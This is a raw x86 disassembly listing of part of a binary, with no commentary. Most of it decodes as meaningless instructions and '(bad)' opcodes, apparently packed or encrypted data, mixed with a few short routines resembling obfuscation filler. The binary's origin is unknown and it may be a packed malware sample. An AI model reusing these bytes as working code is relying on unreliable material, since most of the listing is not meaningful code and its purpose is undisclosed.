  406174:	shl    cl,1
  406176:	mov    edi,0x4ef60125
  40617b:	inc    esi
  40617c:	push   cs
  40617d:	cld    
  40617e:	xor    DWORD PTR [edi-0x59],esp
  406181:	enter  0xa9db,0x58
  406185:	inc    ebp
  406186:	jae    0x406113
  406188:	sub    eax,0x8085dd51
  40618d:	add    ah,BYTE PTR [edx+edi*8]
  406190:	out    0x10,al
  406192:	adc    ecx,ebx
  406194:	sbb    al,0x73
  406196:	mov    al,0xda
  406198:	push   ecx
  406199:	popa   
  40619a:	sbb    BYTE PTR [esi-0xf43f73e],dl
  4061a0:	fisubr WORD PTR [edx]
  4061a2:	sbb    BYTE PTR [ebx-0x4f],dh
  4061a5:	mov    edx,0xdd82e16e
  4061aa:	push   edx
  4061ab:	inc    ebp
  4061ac:	gs aam 0x6a
  4061af:	jo     0x40614a
  4061b1:	xchg   DWORD PTR [eax],edx
  4061b3:	inc    ecx
  4061b4:	mov    bl,0xe9
  4061b6:	or     bl,BYTE PTR [esi-0x7a41426d]
  4061bc:	ror    BYTE PTR [eax+eax*4-0x3e],cl
  4061c0:	sbb    BYTE PTR [edx],bh
  4061c2:	mov    bh,0x73
  4061c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4061c5:	add    al,0x23
  4061c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4061c8:	add    cl,BYTE PTR [ebp+0x2a]
  4061cb:	and    ch,bh
  4061cd:	xor    cl,bh
  4061cf:	(bad)  
  4061d0:	ret    
  4061d1:	mov    dl,dl
  4061d3:	scas   al,BYTE PTR es:[edi]
  4061d4:	inc    eax
  4061d5:	xor    DWORD PTR [edi],ebx
  4061d7:	xchg   edi,eax
  4061d8:	in     eax,dx
  4061d9:	lea    esi,[esi]
  4061db:	pop    edi
  4061dc:	adc    eax,0x66a3600e
  4061e1:	adc    DWORD PTR [eax-0x3a],eax
  4061e4:	mov    bh,0xd
  4061e6:	inc    ebp
  4061e7:	sub    al,0x80
  4061e9:	and    eax,0x7bfcc920
  4061ee:	ret    0x9db
  4061f1:	dec    ecx
  4061f2:	xor    eax,ecx
  4061f4:	cmp    esi,eax
  4061f6:	xchg   ebx,esp
  4061f8:	pop    eax
  4061f9:	xchg   esi,eax
  4061fa:	aas    
  4061fb:	repnz dec esi
  4061fd:	lods   al,BYTE PTR ds:[esi]
  4061fe:	pop    ds
  4061ff:	mov    esp,0xb1c5cfa4
  406204:	mov    eax,ds:0xf48919f5
  406209:	jmp    0xe512:0xbc4fd242
  406210:	hlt    
  406211:	cmp    al,BYTE PTR [ebx]
  406213:	pop    ecx
  406214:	inc    ebx
  406215:	jno    0x4061b4
  406217:	push   0x1be7671d
  40621c:	xchg   DWORD PTR [ebx],eax
  40621e:	push   ds
  40621f:	lods   al,BYTE PTR ds:[esi]
  406220:	push   ecx
  406221:	and    eax,0x9c54f07b
  406226:	out    dx,eax
  406227:	push   ss
  406228:	inc    eax
  406229:	xor    BYTE PTR [ebx-0x38],0xb3
  40622d:	iret   
  40622e:	cmc    
  40622f:	cli    
  406230:	and    DWORD PTR [ebx],edi
  406232:	or     eax,0x328f3ceb
  406237:	cdq    
  406238:	dec    esp
  406239:	int    0x9c
  40623b:	adc    DWORD PTR [ecx-0x1c],edi
  40623e:	stc    
  40623f:	pop    ebx
  406240:	fstp   QWORD PTR [edi+0x50]
  406243:	or     esi,DWORD PTR [ebp-0xe]
  406246:	cmp    BYTE PTR [edx+edi*4-0x4f76db9d],al
  40624d:	sub    al,0x42
  40624f:	xchg   esi,eax
  406250:	mov    edi,0xe6b24199
  406255:	inc    ebx
  406256:	fs cli 
  406258:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406259:	jmp    0xb26e6d1c
  40625e:	jnp    0x406230
  406260:	push   eax
  406261:	rol    edi,1
  406263:	das    
  406264:	test   al,0xe9
  406266:	dec    ecx
  406267:	xchg   ebp,eax
  406268:	dec    edi
  40626a:	(bad)
  40626d:	xorpd  xmm4,XMMWORD PTR ss:[ebx]
  406272:	xchg   ebp,eax
  406273:	push   0xffffff95
  406275:	mov    ds:0x5aa055cf,al
  40627a:	ror    BYTE PTR [ebx+0x39d4ad21],1
  406280:	xor    esi,DWORD PTR [ebp-0x73]
  406283:	xor    bh,ah
  406285:	dec    eax
  406286:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406287:	outs   dx,DWORD PTR ds:[esi]
  406288:	leave  
  406289:	or     dh,BYTE PTR [ebx]
  40628b:	test   dh,dh
  40628d:	or     ch,BYTE PTR fs:[ecx+0x1]
  406291:	dec    edi
  406292:	mov    edi,0xa071c13e
  406297:	call   FWORD PTR [ecx+0x33f8758b]
  40629d:	ret    0xf233
  4062a0:	add    eax,ecx
  4062a2:	add    esi,ecx
  4062a4:	imul   eax,esi
  4062a7:	mov    esi,DWORD PTR [ebp+0xc]
  4062aa:	cmp    esi,eax
  4062ac:	mov    eax,DWORD PTR [ebp-0x4]
  4062af:	je     0x405ea6
  4062b5:	xor    eax,edx
  4062b7:	add    eax,ecx
  4062b9:	mov    ecx,DWORD PTR [ebp+0xc]
  4062bc:	imul   eax,ecx
  4062bf:	add    eax,DWORD PTR [ebp+0x8]
  4062c2:	mov    DWORD PTR [ebp+0xc],eax
  4062c5:	mov    eax,DWORD PTR [ebp+0xc]
  4062c8:	pop    esi
  4062c9:	leave  
  4062ca:	ret    0x8
  4062cd:	push   ebp
  4062ce:	mov    ebp,esp
  4062d0:	push   ecx
  4062d1:	mov    DWORD PTR ds:0x43369f,0x7109
  4062db:	jmp    0x406534
  4062e0:	(bad)  
  4062e1:	fwait
  4062e2:	dec    edi
  4062e3:	ds jge 0x4062d0
  4062e6:	push   ecx
  4062e7:	mov    ds:0xe05cf94c,eax
  4062ec:	add    esp,DWORD PTR [esi+0x7d]
  4062ef:	pop    es
  4062f0:	xor    al,0x3b
  4062f2:	jl     0x406370
  4062f4:	xor    BYTE PTR [esi+0x7c],bh
  4062f7:	jl     0x406334
  4062f9:	arpl   WORD PTR [esi],di
  4062fb:	je     0x406299
  4062fd:	adc    ah,BYTE PTR es:[esi+0x2fe84a7f]
  406304:	mov    es,WORD PTR [ebp+eax*8+0x316a6a9a]
  40630b:	fsub   DWORD PTR ds:0x765b0b6f
  406312:	xchg   edx,eax
  406313:	jp     0x40629f
  406315:	sahf   
  406316:	jmp    0x5fad4960
  40631b:	sub    BYTE PTR [esi],dl
  40631d:	add    al,0x38
  40631f:	add    ah,BYTE PTR [eax+0x419bce13]
  406325:	(bad)  
  406326:	pop    es
  406327:	repz mov edi,0xfe1bca7e
  40632d:	jbe    0x4063a9
  40632f:	clc    
  406330:	and    esi,DWORD PTR [ebx+0x78d9a75d]
  406336:	mov    dl,0x55
  406338:	outs   dx,DWORD PTR ds:[esi]
  406339:	xchg   BYTE PTR [eax],bh
  40633b:	ficomp DWORD PTR [esi+0x30]
  40633e:	test   DWORD PTR [ecx],eax
  406340:	mov    edi,0xafc81c1e
  406345:	xlat   BYTE PTR ds:[ebx]
  406346:	cmp    bh,BYTE PTR [eax]
  406348:	in     eax,dx
  406349:	lea    esi,[edi]
  40634b:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40634d:	les    esi,FWORD PTR [esi-0x69]
  406350:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406351:	mov    edx,0x5a80ac85
  406356:	xor    ebp,DWORD PTR [ebp+0x7e0b1df4]
  40635c:	sbb    dl,BYTE PTR [ebx]
  40635e:	setg   dl
  406361:	cli    
  406362:	dec    esp
  406363:	and    eax,0xa5d119ee
  406368:	addr16 lock loopne 0x4063a8
  40636c:	lea    edi,[edx-0x16efb585]
  406372:	cdq    
  406373:	data16 xlat BYTE PTR ds:[ebx]
  406375:	hlt    
  406376:	dec    esi
  406377:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406378:	cmc    
  406379:	aaa    
  40637a:	sub    al,0x52
  40637c:	or     DWORD PTR [ecx-0xff590a1],esp
  406382:	jecxz  0x4063f6
  406384:	pop    ebp
  406385:	outs   dx,BYTE PTR ds:[si]
  406387:	into   
  406388:	hlt    
  406389:	int    0x2e
  40638b:	xchg   ecx,eax
  40638c:	dec    ebx
  40638d:	jp     0x406405
  40638f:	sub    DWORD PTR [ecx-0x409b20ce],edi
  406395:	int3   
  406396:	out    0x59,al
  406398:	test   eax,0x33181e77
  40639d:	push   es
  40639e:	into   
  40639f:	loope  0x406339
  4063a1:	jg     0x406370
  4063a3:	mov    bh,ch
  4063a5:	lods   eax,DWORD PTR ds:[esi]
  4063a6:	int    0x18
  4063a8:	out    dx,eax
  4063a9:	popf   
  4063aa:	push   0x55ebcd3
  4063af:	jg     0x40640b
  4063b1:	add    al,0x6d
  4063b3:	pop    ss
  4063b4:	add    edi,DWORD PTR [esi-0x28]
  4063b7:	fwait
  4063b8:	dec    esp
  4063b9:	cmp    ah,BYTE PTR [esi]
  4063bb:	xchg   esi,eax
  4063bc:	sub    DWORD PTR [ebp+0x7ef3ae19],esp
  4063c2:	sar    DWORD PTR ds:[ecx+0x713cb4b9],1
  4063c9:	ror    ah,1
  4063cb:	retf   0x67ef
  4063ce:	retf   
  4063cf:	ds xchg ebp,eax
  4063d1:	dec    BYTE PTR [esi+esi*2+0x6b502ed9]
  4063d8:	pop    eax
  4063d9:	outs   dx,DWORD PTR ds:[esi]
  4063da:	push   es
  4063db:	xchg   ecx,ebp
  4063dd:	or     ch,bh
  4063df:	lea    esp,[edx+0x64a4416c]
  4063e5:	cmp    eax,0xe3ba27b1
  4063ea:	ss das 
  4063ec:	xlat   BYTE PTR ds:[ebx]
  4063ed:	sub    al,0x64
  4063ef:	dec    ecx
  4063f0:	loop   0x406375
  4063f2:	sbb    ecx,edi
  4063f4:	dec    esp
  4063f5:	or     DWORD PTR [ebp+0x50329a4f],0xfffffff2
  4063fc:	and    DWORD PTR [edi+eax*1-0x7f19b72b],ebx
  406403:	sub    eax,edi
  406405:	lods   al,BYTE PTR ds:[esi]
  406406:	add    DWORD PTR [esi+0x3e],edx
  406409:	cmp    DWORD PTR [eax-0x4c3fc8ee],eax
  40640f:	jmp    0x406456
  406411:	push   eax
  406412:	outs   dx,BYTE PTR ds:[esi]
  406413:	shl    BYTE PTR [edx-0x64b8ee5a],0x87
  40641a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40641b:	imul   eax,eax,0x595aa0dc
  406421:	adc    al,0x51
  406423:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406424:	loopne 0x4063bb
  406426:	jns    0x40643e
  406428:	inc    ecx
  406429:	cs pop ecx
  40642b:	mov    WORD PTR [edx],ss
  40642d:	and    al,BYTE PTR [ecx+0x5068c487]
  406433:	sbb    eax,0xd494e146
  406438:	(bad)  [edi]
  40643a:	push   ebp
  40643b:	xchg   ebp,eax
  40643c:	aad    0x9
  40643e:	in     eax,0x7f
  406440:	pop    esp
  406441:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406442:	and    al,BYTE PTR [eax]
  406444:	jb     0x4063f6
  406446:	xor    dl,ah
  406448:	iret   
  406449:	pop    eax
  40644a:	test   al,0x99
  40644c:	jecxz  0x4064ac
  40644e:	dec    eax
  40644f:	dec    eax
  406450:	push   eax
  406451:	pop    eax
  406452:	outs   dx,BYTE PTR ds:[esi]
  406453:	mov    al,0xc0
  406455:	in     eax,dx
  406456:	push   cs
  406457:	xor    DWORD PTR [eax-0x6],edi
  40645a:	ret    0xf3d0
  40645d:	out    0x16,eax
  40645f:	pop    ecx
  406460:	mov    dh,0x5b
  406462:	sar    DWORD PTR [edi-0x33620350],cl
  406468:	cli    
  406469:	aas    
  40646a:	ins    BYTE PTR es:[edi],dx
  40646b:	ret    
  40646c:	js     0x40648b
  40646e:	xchg   BYTE PTR [ecx],dl
  406470:	addr16 pop ecx
  406472:	and    eax,0x7f3bc9e4
  406477:	scas   al,BYTE PTR es:[edi]
  406478:	scas   al,BYTE PTR es:[edi]
  406479:	adc    dh,BYTE PTR [eax]
  40647b:	rol    bl,cl
  40647d:	(bad)  
  40647e:	pop    edi
  40647f:	shl    BYTE PTR [edi-0x3d],0xb8
  406483:	fisttp DWORD PTR [eax+ebx*4+0x71fb4a48]
  40648a:	jmp    0x119cc5ee
  40648f:	lds    ebp,FWORD PTR [edi+0x2022b26]
  406495:	dec    esp
  406496:	out    0xf8,al
  406498:	xchg   edi,eax
  406499:	iret   
  40649a:	and    BYTE PTR [ecx],ch
  40649c:	loop   0x406422
  40649e:	adc    al,0x9e
  4064a0:	dec    edi
  4064a1:	pop    esi
  4064a2:	xchg   BYTE PTR [edx-0x13],dl
  4064a5:	add    cl,al
  4064a7:	sub    esi,DWORD PTR ss:[edi+0x62]
  4064ab:	inc    ecx
  4064ac:	add    dl,BYTE PTR [esi-0x75]
  4064af:	in     eax,dx
  4064b0:	sbb    dh,BYTE PTR [edx+0x4cf1500f]
  4064b6:	or     edx,esp
  4064b8:	in     al,0xf3
  4064ba:	sub    DWORD PTR [ebx-0x40],edi
  4064bd:	and    ebx,esi
  4064bf:	(bad)  
  4064c0:	jge    0x4064e4
  4064c2:	std    
  4064c3:	or     ebp,DWORD PTR [eax+0x30]
  4064c6:	je     0x25d3d319
  4064cc:	sbb    al,0x1a
  4064ce:	out    dx,eax
  4064cf:	cmp    BYTE PTR [esi+ecx*1+0x1234e68f],dh
  4064d6:	sbb    DWORD PTR [eax-0x12221767],eax
  4064dc:	aad    0xba
  4064de:	dec    edx
  4064df:	rcl    ch,1
  4064e1:	and    al,0x15
  4064e3:	aaa    
  4064e4:	pushf  
  4064e5:	rol    DWORD PTR [edi-0x51],1
  4064e8:	je     0x4064fc
  4064ea:	sub    cl,bh
  4064ec:	rcl    DWORD PTR [ebx-0x16],cl
  4064ef:	push   ebx
  4064f0:	and    eax,0xd83cedc
  4064f5:	push   eax
  4064f6:	or     eax,0x1b9c44fd
  4064fb:	push   esp
  4064fc:	ret    
  4064fd:	xchg   ebx,eax
  4064fe:	aas    
  4064ff:	xchg   edi,ebp
  406501:	jo     0x406544
  406503:	dec    eax
  406504:	mov    ds:0x7e205722,eax
  406509:	js     0x4064b1
  40650b:	cs (bad) 
  40650e:	pop    ebp
  40650f:	fisttp WORD PTR [edx]
  406511:	ror    BYTE PTR ds:0x82f2b7f9,1
  406517:	jg     0x40656b
  406519:	xor    bh,BYTE PTR [ebp+ecx*4+0x1cf6dc7e]
  406520:	dec    esp
  406521:	dec    edx
  406522:	adc    eax,0x1c16dfc1
  406527:	cmp    DWORD PTR [eax],ebx
  406529:	icebp  
  40652a:	dec    edx
  40652b:	mov    ecx,0x3ca704f6
  406530:	mov    bl,0xab
  406532:	out    dx,al
  406533:	call   DWORD PTR [ecx-0x48]
  406536:	or     DWORD PTR [eax+0x0],0xfc9eb800
  40653d:	mov    ds:0xfc458905,eax
  406542:	mov    ecx,DWORD PTR [ebp-0x4]
  406545:	mov    DWORD PTR ds:0x4336a7,0x6d12
  40654f:	mov    DWORD PTR [ebp-0x8],0x4ec5
  406556:	mov    DWORD PTR ds:0x43375f,0x756c
  406560:	cmp    ecx,eax
  406562:	mov    DWORD PTR ds:0x43365b,0x510c
  40656c:	jne    0x406d16
  406572:	mov    ax,WORD PTR [ebp-0x8]
  406576:	and    DWORD PTR ds:0x4336df,0x0
  406580:	mov    ecx,DWORD PTR ds:0x4336df
  406586:	inc    ecx
  406587:	mov    DWORD PTR ds:0x4336df,ecx
  40658d:	cmp    DWORD PTR ds:0x4336df,0x9
  406594:	jne    0x4065a5
  40659a:	push   0x3195
  40659f:	call   DWORD PTR ds:0x4120c0
  4065a5:	cmp    DWORD PTR ds:0x4336df,0x8
  4065ac:	jne    0x4065bf
  4065b2:	mov    ecx,DWORD PTR ds:0x4336df
  4065b8:	inc    ecx
  4065b9:	mov    DWORD PTR ds:0x4336df,ecx
  4065bf:	cmp    DWORD PTR ds:0x4336df,0x11
  4065c6:	jb     0x406580
  4065cc:	jmp    0x406825
  4065d1:	fld    st(1)
  4065d3:	addr16 into 
  4065d5:	outs   dx,BYTE PTR ds:[si]
  4065d7:	jno    0x4065ca
  4065d9:	add    eax,0xd895211a
  4065de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065df:	fmul   QWORD PTR [eax+ebp*8-0x3b]
  4065e3:	jl     0x406661
  4065e5:	xor    BYTE PTR [esi+0x7c],bh
  4065e8:	jl     0x4065bd
  4065ea:	sub    eax,0x3fd167d2
  4065ef:	jl     0x40660f
  4065f1:	fimul  WORD PTR [edi-0x13]
  4065f4:	sahf   
  4065f5:	sub    DWORD PTR [edx+edx*8],edi
  4065f8:	xchg   ecx,eax
  4065f9:	(bad)  
  4065fa:	je     0x406658
  4065fc:	cmp    al,0xd
  4065fe:	fidivr DWORD PTR [edx+0x2e1e23b2]
  406604:	xor    ebx,DWORD PTR [ebp-0x2b939040]
  40660a:	push   es
  40660b:	sti    
  40660c:	ffreep st(6)
  40660e:	arpl   cx,ax
  406610:	call   0x3f79:0xe836fe11
  406617:	add    eax,0xc8c836db
  40661c:	xchg   ebx,eax
  40661d:	xlat   BYTE PTR ds:[ebx]
  40661e:	cmp    ch,bh
  406620:	xchg   DWORD PTR [edi-0x36],esi
  406623:	fimul  DWORD PTR [edx]
  406625:	jl     0x4065fd
  406627:	adc    al,0xc3
  406629:	ds aad 0xd9
  40662c:	fdivr  DWORD PTR [ebx]
  40662e:	test   BYTE PTR [esi],al
  406630:	adc    BYTE PTR [esi-0x4bc7d40e],cl
  406636:	stc    
  406637:	lods   al,BYTE PTR ds:[esi]
  406638:	(bad)  
  40663a:	mov    ds:0xe5ad8ddf,eax
  40663f:	sbb    edx,ebx
  406641:	dec    ebp
  406642:	int    0x6
  406644:	fisttp DWORD PTR [edi+0x6b]
  406647:	sub    DWORD PTR [ecx],edi
  406649:	out    dx,al
  40664a:	popf   
  40664b:	inc    esi
  40664c:	pop    esp
  40664d:	and    eax,DWORD PTR [edx-0x33]
  406650:	pop    ds
  406651:	mov    bl,0x42
  406653:	cmp    eax,0x74bc6747
  406658:	pop    ds
  406659:	or     BYTE PTR [edi+0x500a38be],ch
  40665f:	repnz push ds
  406661:	mov    ecx,0x187be045
  406666:	pop    eax
  406667:	lods   al,BYTE PTR ds:[esi]
  406668:	pop    esi
  406669:	loope  0x40664e
  40666b:	(bad)  
  40666c:	jno    0x406680
  40666e:	mov    dl,0x3b
  406670:	div    BYTE PTR [ebx+edi*8+0x5d5e11d6]
  406677:	or     dh,dh
  406679:	outs   dx,DWORD PTR ds:[esi]
  40667a:	sti    
  40667b:	int3   
  40667c:	mov    cl,BYTE PTR [edi+0x36]
  40667f:	je     0x4066d2
  406681:	mov    bh,BYTE PTR [ebp-0x3950836]
  406687:	push   esi
  406688:	add    al,0x52
  40668a:	retf   0xe714
  40668d:	xchg   esi,eax
  40668e:	daa    
  40668f:	dec    edx
  406690:	sbb    bl,dh
  406692:	test   BYTE PTR [ecx],ah
  406694:	pop    ebp
  406695:	sbb    al,0xdd
  406697:	push   edx
  406698:	imul   esp,eax,0x4828162c
  40669e:	jnp    0x40664a
  4066a0:	cmp    DWORD PTR [esi+0x6deab143],ebx
  4066a6:	cmc    
  4066a7:	cli    
  4066a8:	aaa    
  4066a9:	mov    dh,0x81
  4066ab:	push   eax
  4066ac:	dec    edi
  4066ad:	push   ds
  4066ae:	push   ss
  4066af:	not    BYTE PTR [edx+0x1644a02]
  4066b5:	stos   DWORD PTR es:[edi],eax
  4066b6:	adc    eax,0xaf84eccf
  4066bb:	imul   ebx,DWORD PTR [ecx],0x71
  4066be:	mov    edx,0x2998ebbe
  4066c3:	jno    0x4066da
  4066c5:	cld    
  4066c6:	mov    edx,0x9661c422
  4066cb:	and    BYTE PTR [esi],al
  4066cd:	pop    ss
  4066ce:	pop    ss
  4066cf:	das    
  4066d0:	mov    ds:0xd905c0b6,al
  4066d5:	cld    
  4066d6:	pop    esp
  4066d7:	lds    eax,FWORD PTR [ebp+ecx*2+0x47]
  4066db:	pop    edx
  4066dc:	xchg   BYTE PTR [ecx],dh
  4066de:	and    eax,0xf7a4eb25
  4066e3:	push   0x32c2f1e2
  4066e8:	call   0x4945:0xdac3cbd4
  4066ef:	lds    ebp,FWORD PTR [esi]
  4066f1:	add    ebp,ecx
  4066f3:	or     DWORD PTR [edx+0x5c],ebx
  4066f6:	jg     0x40671c
  4066f8:	adc    DWORD PTR [edi],eax
  4066fa:	jmp    0xdb3ec0fb
  4066ff:	fs scas eax,DWORD PTR es:[edi]
  406701:	pop    es
  406702:	or     eax,0x4b8f79d3
  406707:	add    cl,BYTE PTR [esi-0x2d]
  40670a:	je     0x406720
  40670c:	dec    edx
  40670d:	es push ds
  40670f:	adc    bh,BYTE PTR [ebx-0x5231878e]
  406715:	cmovo  ecx,DWORD PTR [ecx+0x663a2eb1]
  40671c:	scas   al,BYTE PTR es:[edi]
  40671d:	daa    
  40671e:	mov    WORD PTR [ebp+edx*8-0x5f],fs
  406722:	xor    al,BYTE PTR cs:[ecx+0x4e]
  406726:	pop    ebp
  406727:	or     eax,0xf16482d5
  40672c:	mov    ebp,0xe68c5b86
  406731:	cli    
  406732:	push   esp
  406733:	aam    0x8a
  406735:	call   0xb4cd1ec6
  40673a:	scas   al,BYTE PTR es:[edi]
  40673b:	mov    dh,bl
  40673d:	jg     0x4067ab
  40673f:	test   BYTE PTR [ecx+0x2a16bd6e],0x55
  406746:	enter  0xc9ce,0x78
  40674a:	pop    es
  40674b:	push   cs
  40674c:	and    eax,0x3269bd6a
  406751:	test   ah,bh
  406753:	test   BYTE PTR [edi+0x64],bl
  406756:	inc    edx
  406757:	pop    esi
  406758:	aad    0x32
  40675a:	ja     0x4066ee
  40675c:	js     0x40670e
  40675e:	sbb    BYTE PTR [ecx+0x36],bl
  406761:	jecxz  0x4067a8
  406763:	add    eax,0x2ec24b5c
  406768:	ins    BYTE PTR es:[edi],dx
  406769:	data16 outs dx,BYTE PTR ds:[esi]
  40676b:	lahf   
  40676c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40676d:	or     BYTE PTR [edx+0x4c025b8b],al
  406773:	loope  0x4067b7
  406775:	in     al,0xd5
  406777:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406778:	dec    esi
  406779:	add    edx,DWORD PTR [ebx]
  40677b:	test   DWORD PTR [ecx+esi*8+0x4b],esp
  40677f:	push   es
  406780:	jae    0x406710
  406782:	add    eax,0x9d208509
  406787:	mov    ?,WORD PTR [edi]
  406789:	int    0x6f
  40678b:	je     0x4067b1
  40678d:	xchg   ebp,eax
  40678e:	aad    0xa4
  406790:	ins    BYTE PTR es:[edi],dx
  406791:	lods   al,BYTE PTR ds:[esi]
  406792:	mov    eax,0xe5edc240
  406797:	call   0x8ab44d4e
  40679c:	ins    DWORD PTR es:[edi],dx
  40679d:	sbb    esi,DWORD PTR [ecx+edi*2]
  4067a0:	mov    bh,0x13
  4067a2:	cmp    BYTE PTR [esi],dh
  4067a4:	js     0x4067d6
  4067a6:	shl    DWORD PTR [ecx-0x8],cl
  4067a9:	pop    ds
  4067aa:	xchg   esi,eax
  4067ab:	or     eax,0x12df8668
  4067b0:	aas    
  4067b1:	pop    ds
  4067b2:	xchg   ebp,eax
  4067b3:	mov    esi,0x97deb9b7
  4067b8:	sub    esi,DWORD PTR [ebx]
  4067ba:	add    al,0xa
  4067bc:	sbb    DWORD PTR [ebx],0xde68e2e7
  4067c2:	cmp    bl,BYTE PTR [edi+0x556423f2]
  4067c8:	fidiv  DWORD PTR [edi-0x2b]
  4067cb:	leave  
  4067cc:	pop    ebp
  4067cd:	and    bl,ah
  4067cf:	retf   0xe383
  4067d2:	je     0x4067fb
  4067d4:	mov    ds:0x15b78bd3,eax
  4067d9:	cmp    BYTE PTR [ecx+0x7e],al
  4067dc:	(bad)  
  4067dd:	or     eax,0xa935d42a
  4067e2:	add    esi,DWORD PTR [edi+0x32]
  4067e5:	ins    BYTE PTR es:[edi],dx
  4067e6:	in     al,dx
  4067e7:	cmp    DWORD PTR [ebp-0x598eadc7],0xb461d49f
  4067f1:	add    DWORD PTR [edi-0x34],eax
  4067f4:	cwde   
  4067f5:	or     DWORD PTR [edi+0x44b9d1b6],edx
  4067fb:	nop
  4067fc:	push   eax
  4067fd:	dec    esp
  4067fe:	repnz add DWORD PTR [eax+edx*1-0xaa80c09],eax
  406806:	mov    dh,0xff
  406808:	aam    0x55
  40680a:	mov    esp,0x4d308968
  40680f:	add    al,0x3d
  406811:	je     0x4067be
  406813:	sahf   
  406814:	mov    dl,0xc0
  406816:	enter  0xe8c1,0x4d
  40681a:	push   0x7
  40681c:	add    ah,bh
  40681e:	fs lock in eax,dx
  406821:	adc    dh,al
  406823:	xlat   BYTE PTR ds:[ebx]
  406824:	pop    ds
  406825:	mov    ecx,0x8a3a
  40682a:	jmp    0x406a83
  40682f:	or     ah,cl
  406831:	mov    ah,0x1f
  406833:	jo     0x40689c
  406835:	xchg   ebx,eax
  406836:	jmp    0x406845
  406838:	push   ss
  406839:	test   eax,0xfde6d5cb
  40683e:	test   DWORD PTR [edi+eax*8+0x7e307c7c],ebp
  406845:	jl     0x4068c3
  406847:	in     eax,dx
  406848:	outs   dx,BYTE PTR ds:[esi]
  406849:	scas   al,BYTE PTR es:[edi]
  40684a:	xchg   esp,eax
  40684b:	repz jecxz 0x40686a
  40684e:	jo     0x40688b
  406850:	inc    esp
  406851:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406852:	mov    ebp,0xccb3704b
  406857:	int3   
  406858:	or     ah,BYTE PTR [eax+0x45]
  40685b:	(bad)  
  40685c:	aaa    
  40685d:	jmp    0x4068bd
  40685f:	js     0x406899
  406861:	lds    ecx,FWORD PTR [esi+0x36c39f25]
  406867:	ins    BYTE PTR es:[edi],dx
  406868:	push   0x6f
  40686a:	in     al,dx
  40686b:	nop
  40686c:	cmp    edx,ebp
  40686e:	popf   
  40686f:	fst    QWORD PTR [esi+0x911c5e4]
  406875:	rcl    ch,1
  406877:	fwait
  406878:	xchg   edi,eax
  406879:	cs mov ah,0x1
  40687c:	push   edi
  40687d:	or     ecx,ebp
  40687f:	int3   
  406880:	mov    al,0xf6
  406882:	loop   0x406846
  406884:	mov    ecx,DWORD PTR [edx]
  406886:	or     BYTE PTR [esi+0x110cc7de],dh
  40688c:	ins    DWORD PTR es:[edi],dx
  40688d:	je     0x40689f
  40688f:	jo     0x4068e4
  406891:	push   esp
  406892:	push   esi
  406893:	out    dx,al
  406894:	or     cl,ah
  406896:	mov    esi,0xd429c485
  40689b:	fidivr DWORD PTR [ebx+0x25]
  40689e:	jbe    0x4068af
  4068a0:	test   BYTE PTR [edx+0x59cd99d3],cl
  4068a6:	ror    BYTE PTR [edx-0x7f],1
  4068a9:	mov    ch,0xc4
  4068ab:	or     BYTE PTR [esi-0xcce93d5],0x66
  4068b2:	sbb    eax,0xc1565ac9
  4068b7:	cwde   
  4068b8:	pop    ebp
  4068b9:	scas   eax,DWORD PTR es:[edi]
  4068ba:	inc    edx
  4068bb:	shl    BYTE PTR [edx+eiz*4],0xd4
  4068bf:	ds (bad) 
  4068c1:	pop    ebx
  4068c2:	and    DWORD PTR [edi+0x47251430],eax
  4068c8:	jg     0x406853
  4068ca:	gs ja  0x406921
  4068cd:	adc    al,cl
  4068cf:	cs dec ebx
  4068d1:	mov    DWORD PTR [ecx],esp
  4068d3:	jp     0x4068e7
  4068d5:	sti    
  4068d6:	mov    eax,0xe0c539ea
  4068db:	jo     0x406871
  4068dd:	jecxz  0x40690b
  4068df:	sahf   
  4068e0:	repz adc BYTE PTR [ecx+0x3b],bl
  4068e4:	cmp    al,0xdd
  4068e6:	in     al,0xf6
  4068e8:	loop   0x4068c7
  4068ea:	xchg   edx,eax
  4068eb:	mov    cl,0xe7
  4068ed:	data16 xchg ah,ah
  4068f0:	push   ss
  4068f1:	inc    ebp
  4068f2:	adc    BYTE PTR [edx+eax*4+0x1c8c90ed],ah
  4068f9:	xchg   ebp,eax
  4068fa:	fidivr DWORD PTR [edx-0x66]
  4068fd:	aam    0xcd
  4068ff:	pushf  
  406900:	lods   eax,DWORD PTR ds:[esi]
  406901:	or     al,BYTE PTR [eax-0x1f0f3e4d]
  406907:	xor    eax,0x9751bfbc
  40690c:	repz retf 0xa2fd
  406910:	adc    al,BYTE PTR [edx-0x28]
  406913:	addr16 adc al,0x51
  406916:	lahf   
  406917:	or     BYTE PTR [esi+0x279ebe2f],ah
  40691d:	xor    DWORD PTR [di],ebp
  406920:	push   cs
  406921:	and    ecx,ebp
  406923:	cmp    eax,0x54
  406926:	lds    ecx,FWORD PTR [ebx-0x1f]
  406929:	test   DWORD PTR [eax],ebp
  40692b:	ins    BYTE PTR es:[edi],dx
  40692c:	pop    ecx
  40692d:	nop
  40692e:	ins    DWORD PTR es:[edi],dx
  40692f:	mov    eax,0x824138f0
  406934:	(bad)  
  406935:	adc    eax,0xeec9da6a
  40693a:	mov    dh,0xe8
  40693c:	stos   BYTE PTR es:[edi],al
  40693d:	mov    edi,DWORD PTR [ecx-0x3e8ca85d]
  406943:	lea    edi,[ecx+0x70]
  406946:	bound  esp,QWORD PTR [esi+eax*1+0x4a]
  40694a:	mov    ecx,DWORD PTR [esi-0x6c52acb9]
  406950:	retf   
  406951:	pop    esp
  406952:	adc    eax,0xc776ce0e
  406957:	mov    ds:0x9c51ca49,al
  40695c:	jle    0x406950
  40695e:	cwde   
  40695f:	xor    BYTE PTR [ebp-0x63436ccc],al
  406965:	push   edx
  406966:	add    al,0x2a
  406968:	mov    bh,0xbb
  40696a:	js     0x406905
  40696c:	add    edi,DWORD PTR [esi]
